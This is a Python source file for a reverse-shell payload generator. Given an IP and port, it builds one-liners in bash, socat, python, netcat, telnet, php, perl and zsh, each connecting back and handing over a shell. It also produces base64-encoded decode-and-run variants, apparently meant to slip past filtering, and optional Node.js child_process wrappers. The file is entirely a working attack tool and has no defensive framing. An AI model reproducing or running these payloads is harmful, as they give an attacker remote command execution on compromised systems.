import base64


class PayLoads:

    def __init__(self, ip, port, node=False):
        self.ip = ip
        self.port = port
        self.use_node = node

    def nodejs(self, payloads):
        node_payloads = []
        for ini_payload in payloads:
            nodejs_payload = f'''require('child_process').exec("{ini_payload}")'''
            node_payloads.append(nodejs_payload)
        return node_payloads

    def base64_payloads(self, payloads):
        base64_payloads = []
        for payload in payloads:
            cli = payload.encode("utf-8")
            encoded = base64.b64encode(cli).decode('utf-8')
            base64_payload = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
            base64_payloads.append(base64_payload)
        return base64_payloads

    def payloads(self):
        ip = self.ip
        port = self.port
        # BASH payloads
        BASH196 = f'''0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'''
        BASH_DEV = f'''/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"'''
        BASH_READLINE = f'''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'''
        BASH5 = f'''sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'''

        # socat payloads
        SOCAT = f'''socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane'''

        # python payloads
        PYTHON2 = f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
        PYTHON3 = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''

        # BSD payloads
        BSD = f'''mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'''

        # telnet payloads
        TELNET = f'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF'''

        # php payloads
        EXEC1 = f'''php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\''''
        SHELL_EXEC = f'''php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\''''
        SYSTEM = f'''php -r '$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\''''
        WEIRD_QOUTE = f'''php -r '$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\''''

        # perl payloads
        PERL = f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))''' + '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\''
        PERL_NO_SH = f'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''''

        # zsh payloads
        ZSH = f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''
        payloads = [value for name, value in locals().items() if name.isupper()]
        base64_payloads = self.base64_payloads(payloads)
        if self.use_node:
            return self.nodejs(payloads + base64_payloads)
        return payloads + base64_payloads

# NodeJS   --> will be an option to use because its a special case
# require('child_process').exec('')
